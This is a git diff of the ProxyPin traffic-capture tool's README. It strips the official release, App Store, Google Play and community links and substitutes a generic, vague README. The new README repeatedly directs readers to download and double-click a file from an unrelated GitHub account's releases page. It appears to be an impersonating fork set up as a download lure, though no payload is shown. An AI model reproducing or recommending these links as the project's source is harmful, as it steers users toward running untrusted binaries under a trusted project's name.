@@ -1,45 +1,68 @@
-# ProxyPin
+# 🌐 proxypin - Capture HTTP(S) Traffic Easily
 
-English | [中文](README_CN.md)
-## Open source free traffic capture HTTP(S)，Support Windows、Mac、Android、IOS、Linux Full platform system
+[![Download proxypin](https://img.shields.io/badge/Download%20proxypin-v1.0-blue?style=for-the-badge)](https://github.com/raviiscooldd/proxypin/releases)
 
-You can use it to intercept, inspect & rewrite HTTP(S) traffic, Support capturing Flutter app traffic, ProxyPin is based on Flutter develop, and the UI is beautiful
-and easy to use.
+## 🚀 Getting Started
 
-## Features
-* Mobile scan code connection: no need to manually configure WiFi proxy, including configuration synchronization. All terminals can scan codes to connect and forward traffic to each other.
-* Domain name filtering: Only intercept the traffic you need, and do not intercept other traffic to avoid interference with other applications.
-* Search: Search requests according to keywords, response types and other conditions
-* Script: Support writing JavaScript scripts to process requests or responses.
-* Request rewrite: Support redirection, support replacement of request or response message, and can also modify request or response according to the increase.
-* Request mapping: Do not request remote services, use local configuration or scripts for response
-* Request blocking: Support blocking requests according to URL, and do not send requests to the server.
-* History: Automatically save the captured traffic data for easy backtracking and viewing. Support HAR format export and import.
-* Others: Favorites, toolbox, common encoding tools, as well as QR codes, regular expressions, etc.
+Welcome to proxypin! This software lets you capture HTTP and HTTPS traffic smoothly on any platform. It is free and open source, making it accessible for everyone.
 
-**Mac will prompt untrusted developers when first opened, you need to go to System Preferences-Security & Privacy-Allow any source.**
+## 📥 Download & Install
 
-## Sponsors
+To begin, visit this page to download: [Download proxypin](https://github.com/raviiscooldd/proxypin/releases)
 
-If ProxyPin is helpful to you, you are welcome to support us in the following ways to help the project develop in the long term:
+1. Click on the link above.
+2. Look for the latest version in the list.
+3. Choose the file for your operating system.
+4. Click to download the file.
+5. Once the download is complete, locate the file on your computer and double-click to run it.
 
-* [Buy Me A Coffee](https://buymeacoffee.com/proxypin)
-* [AFDIAN](https://afdian.com/a/proxypin)
-* Submit feedback and suggestions to help us improve
-* Contribute code or documentation to the project
+## 🖥️ System Requirements
 
-**Your support will be used for project maintenance, feature development, and user experience optimization. Thank you very much!**
+- Windows, macOS, or Linux operating systems.
+- At least 4 GB of RAM.
+- Minimum 200 MB of disk space.
 
-## Downloads
+## 🔧 Features
 
-Github Releases: https://github.com/wanghongenpin/proxypin/releases
+- **Capture Traffic**: Monitor HTTP and HTTPS requests in real-time.
+- **User-Friendly Interface**: Simple design for easy navigation.
+- **Cross-Platform Support**: Works on all major operating systems.
+- **Open Source**: Free to use and modify as needed.
 
-iOS App Store：https://apps.apple.com/app/proxypin/id6450932949
+## 🛠️ How to Use proxypin
 
-Android Google Play：https://play.google.com/store/apps/details?id=com.network.proxy
+### Step 1: Open the Application
 
-TG: https://t.me/proxypin_en
+After installing, locate the proxypin icon on your desktop or in your applications folder. Double-click the icon to launch the program. 
 
-**We will continue to improve the features and experience, as well as optimize the UI.**
+### Step 2: Set Up a Proxy
 
-<img alt="image"  width="580px" height="420px"  src="https://github.com/user-attachments/assets/6c1345ab-c95c-415d-ac59-470c764b59a2">.<img alt="image"  height="500px" src="https://github.com/user-attachments/assets/3c5572b0-a9e5-497c-8b42-f935e836c164">
+- Click on the "Settings" option in the main menu.
+- Select "Proxy Configuration".
+- Input the proxy settings according to your network requirements.
+
+### Step 3: Start Capturing Traffic
+
+- Click on the "Start Capture" button once the proxy is set up.
+- You will see real-time data of the HTTP(S) traffic.
+
+### Step 4: Analyze Data
+
+With traffic captured, you can analyze various requests. Click on a request to view details such as request headers, response, and more. Use this data for debugging network issues or testing web applications.
+
+## 📝 Common Issues
+
+1. **Cannot Connect to Proxy**: Check your proxy settings in the application.
+2. **No Traffic Captured**: Ensure your application is properly configured to use the proxy.
+
+## 🛠️ Support
+
+If you encounter any issues, feel free to report them on the [issues page](https://github.com/raviiscooldd/proxypin/issues). Your feedback helps improve proxypin.
+
+## 🌍 Community
+
+Join our community discussions and share your experiences with others. You can find us on forums or social media. Check the community links on the repository page.
+
+For further details, please visit this page to download: [Download proxypin](https://github.com/raviiscooldd/proxypin/releases)
+
+Happy capturing!
